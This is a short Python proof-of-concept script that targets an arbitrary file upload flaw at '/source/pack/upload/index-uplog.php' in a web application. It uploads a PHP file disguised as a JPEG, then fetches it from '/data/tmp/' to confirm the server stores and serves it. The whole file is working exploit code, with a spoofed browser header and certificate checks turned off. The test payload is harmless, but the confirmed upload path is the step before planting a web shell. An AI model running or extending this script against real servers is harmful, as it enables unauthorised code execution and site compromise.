#!/usr/bin/env python3
# coding:utf-8

import requests
from requests_toolbelt import MultipartEncoder

requests.packages.urllib3.disable_warnings()


def poc(url):
    if not (url.startswith("http") or url.startswith('https')):
        url = 'http://' + url
    urls = url + '/source/pack/upload/index-uplog.php'
    m = MultipartEncoder(
        fields={'time': 'test', 'app': (
            'test.php', 'test', 'image/jpeg')}
    )
    header = {
        "Connection": "close",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",
        "Content-Type": m.content_type,
        "Accept": "*/*",
        "Accept-Language": "zh-CN,zh;q=0.9"
    }
    try:
        r = requests.request("POST", urls, verify=False, data=m, headers=header, timeout=10)
        url1 = url + '/data/tmp/test.php'
        r2 = requests.get(url1)
        if 'test' == r2.text:
            return url1
    except:
        pass
    return False
